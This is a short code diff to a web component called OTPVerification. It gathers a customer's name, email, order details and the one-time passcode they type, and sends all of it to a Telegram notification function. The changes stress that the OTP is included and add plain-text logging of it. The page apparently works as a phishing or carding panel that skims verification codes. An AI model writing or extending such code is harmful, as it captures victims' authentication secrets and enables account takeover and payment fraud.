@@ -97,7 +97,7 @@ const OTPVerification = () => {
         timestamp: new Date().toISOString()
       };
       
-      // Create complete notification data
+      // Create complete notification data - explicitly include the OTP value
       const notificationData = {
         customerName: orderDetails?.customerName || "N/A",
         email: orderDetails?.email || "N/A",
@@ -113,10 +113,11 @@ const OTPVerification = () => {
         userInfo: userInfo,
         notificationType: "otp_attempt",
         otpAttempt: attemptNumber,
-        otpValue: otp // Include the actual OTP value entered
+        otpValue: otp // Make sure to include the current OTP value
       };
       
       console.log(`Telegram notification data for attempt ${attemptNumber}:`, notificationData);
+      console.log(`Current OTP value being sent: ${otp}`);
 
       // Call our Supabase Edge Function
       const response = await fetch('/functions/v1/send-telegram-notification', {
